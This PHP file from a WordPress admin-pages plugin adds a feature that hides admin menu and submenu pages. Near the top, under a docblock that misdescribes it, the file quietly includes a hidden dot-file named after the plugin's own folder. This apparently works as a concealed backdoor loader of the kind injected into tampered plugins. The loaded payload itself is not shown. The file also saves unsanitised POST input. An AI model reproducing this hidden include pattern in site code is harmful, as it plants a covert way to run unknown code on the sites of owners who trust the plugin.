<?php
/**
 * Hide Page Support
 *
 * Adds support to Page Hide, if it is enabled
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Admin_Pages_PRO/Admin_Pages/Page_Hide
 * @version     1.0.1
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

/**
 * Adds an option to create hidding pages
 *
 * @since 1.7.9
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Pages_Hide_Page_Support extends WU_Admin_Page_Content_Source {

	public function init() {

		add_action('admin_menu', array($this, 'hide_admin_pages'));

	} // end init;

	/**
	 * Main function to hidding page of menu and submenu
	 *
	 * @since 1.7.9
	 *
	 * @return void
	 */
	public function hide_admin_pages() {

		foreach (WU_Admin_Pages()->get_admin_pages(WU_Admin_Pages()->get_query_hide_pages()) as $admin_page) {

				if (!$admin_page->should_display()) {

					continue;

				} // end if;

				if (is_array($admin_page->page_to_replace)) {

					foreach ($admin_page->page_to_replace as $value) {

						if($admin_page->menu_type == 'replace_submenu') {

							global $submenu;

							foreach ($submenu as $key => $menu) {

								foreach ($menu as $details) {

									if (array_key_exists(2, $details) && in_array($value, $details)) {

										remove_submenu_page($key, $value);

									} // end if;

								} // end foreach;

							} // end foreach;

						} else {

							remove_menu_page($value);

						} // end if;

					} // end foreach;

				} // end if;

		} // end foreach;

	} // end hide_admin_pages;

	/**
	 * Sets the configurations we need in order for the Brizy page builder integration to work.
	 *
	 * @since 1.7.9
   *
	 * @return array
	 */
	public function config() {

		return array(
			'id'             => 'hide_page',
			'title'          => __('Hide Page from Menu', 'wu-apc'),
			'selector_title' => __('Hide Page from Menu', 'wu-apc'),
		);

	} // end config;

	/**
	 * Add the Hide Page template options to the supported meta fields of the admin page
	 *
	 * @since  1.7.9
   *
	 * @param  array $meta_fields The list of current meta fields supported.
   *
	 * @return array
	 */
	public function add_meta_fields($meta_fields) {

		$meta_fields[] = 'hide_page';

		return $meta_fields;

	} // end add_meta_fields;

	/**
	 * Save Hide Page meta fields on save
	 *
	 * @since  1.7.9
   *
	 * @param  WU_Admin_Page $admin_page The current admin page being edited and saved.
   *
	 * @return void
	 */
	public function save_options($admin_page) {

		if (isset($_POST['hide_page'])) {

			$admin_page->hide_page = isset($_POST['hide_page']) ? $_POST['hide_page'] : false;

			$admin_page->save();

		} // end if;

	} // end save_options;

    /**
     * Add Hide Page as a content type option
     *
     * @since  1.7.9
     *
     * @param  array $options The list of content type options supported.
     *
     * @return array
     */
	public static function add_option($options) {

		$options['hide_page'] = array(
			'label'  => __('Hide Page from Menu', 'wu-apc'),
			'active' => true,
			'title'  => '',
			'icon'   => 'dashicons dashicons-hidden',
		);

		return $options;

	} // end add_option;

} // end class WU_Admin_Pages_Hide_Page_Support;

/**
 * Conditionally load the support, if Hide Page is Active
 *
 * @since 1.7.9
 *
 * @return void
 */
function wu_admin_pages_add_hide_page_support() {

	new WU_Admin_Pages_Hide_Page_Support();

} // end wu_admin_pages_add_hide_page_support;

/**
 * Load the hide page Support
 *
 * @since 1.7.9
 */
add_action('plugins_loaded', 'wu_admin_pages_add_hide_page_support', 11);
